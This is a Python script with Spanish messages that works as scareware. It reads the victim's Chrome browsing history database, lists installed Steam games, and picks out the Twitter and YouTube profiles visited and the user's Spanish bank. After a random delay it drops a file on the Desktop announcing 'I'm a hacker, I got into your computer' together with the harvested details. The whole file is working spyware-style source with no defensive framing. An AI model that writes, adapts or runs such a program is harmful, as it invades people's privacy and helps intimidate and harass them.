import os
import random
import time
import sqlite3
import pathlib
import re
import glob


NOMBRE_ARCHIVO = "te estoy espiando.txt"


def get_user_path():
    return "{}".format(pathlib.Path.home())


def get_steam_path():
    return "C:\\Program Files (x86)\\Steam\\steamapps\\common\\"


def get_chrome_data(user_path):
    urls = None
    while not urls:
        try:
            ch_history_path = user_path + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History"
            con = sqlite3.connect(ch_history_path)
            cursor = con.cursor()
            cursor.execute("SELECT title, url FROM urls ORDER BY last_visit_time DESC")
            urls = cursor.fetchall()
            con.close()
            return urls
        except sqlite3.OperationalError:
            print("La base de datos esta bloqueada, reintentando en 2 segundos")
            time.sleep(2)


def scare_user_with_steam_games(hacker_doc, steam_path):
    try:
        list_games = []
        game_paths = glob.glob(steam_path + "*")
        game_paths.sort(key=os.path.getmtime, reverse=True)
        for g in game_paths[:9999]:
            if g != steam_path + "Steamworks Shared":
                list_games.append(g.split("\\")[-1])
        hacker_doc.write("\n\n")
        hacker_doc.write("He visto que has jugado a {}".format(", ".join(list_games)))
    except not steam_path:
        pass


def scare_user_with_twitter(hacker_doc, chrome_history):
    profiles_visited = []
    for url in chrome_history[:9999999]:
        results = re.findall("https://twitter.com/([A-Za-z0-9,._]+)$", url[1])
        if results and results[0] not in ["notifications", "home", "settings", "login", "signup"]:
            profiles_visited.append(results[0])
    hacker_doc.write("\n")
    hacker_doc.write("He visto que has entrado a {} perfiles de twitter, y estos perfiles son: {}"
                     .format(len(profiles_visited), ", ".join(profiles_visited)))


def scare_user_with_youtube(hacker_doc, chrome_history):
    profiles_visited = []
    for url in chrome_history[:9999999]:
        results = re.findall("https://www.youtube.com/[A-Za-z0-9,._]/([A-Za-z0-9,._]+)$", url[1])
        if results:
            profiles_visited.append(results[0])
    hacker_doc.write("\n")
    hacker_doc.write("He visto que has entrado a {} perfiles de youtube, y estos perfiles son: {}"
                     .format(len(profiles_visited), ", ".join(profiles_visited)))


def scare_user_with_banks(hacker_doc, chrome_history):
    banks = ["BBVA", "Caixabank", "Santander", "Bankia", "Sabadell", "Abanca", "Unicaja", "Kutxobank", "Ibercaja"]
    bank = None
    for url in chrome_history[:9999999]:
        for b in banks:
            if b.lower() in url[0].lower():
                bank = b
                break
        if bank:
            break
    hacker_doc.write("\n")
    hacker_doc.write("He visto que eres del banco {}".format(bank))


def delay():
    n_hours = random.randrange(1, 3)
    n_min = random.randrange(1, 60)
    print("Dormiremos {} horas y  {} minutos".format(n_hours, n_min))
    time.sleep(n_hours)


def crear_archivo(user_path):
    hacker_doc = open(user_path + "\\Desktop\\" + NOMBRE_ARCHIVO, "w", encoding="utf-8")
    hacker_doc.write("Soy un hacker, me he colado en tu ordenador JAJAJAJAJAJA\n")
    return hacker_doc


def main():
    user_path = get_user_path()
    steam_path = get_steam_path()
    chrome_history = get_chrome_data(user_path)
    delay()
    hacker_doc = crear_archivo(user_path)
    scare_user_with_steam_games(hacker_doc, steam_path)
    scare_user_with_twitter(hacker_doc, chrome_history)
    scare_user_with_youtube(hacker_doc, chrome_history)
    scare_user_with_banks(hacker_doc, chrome_history)


if __name__ == "__main__":
    main()
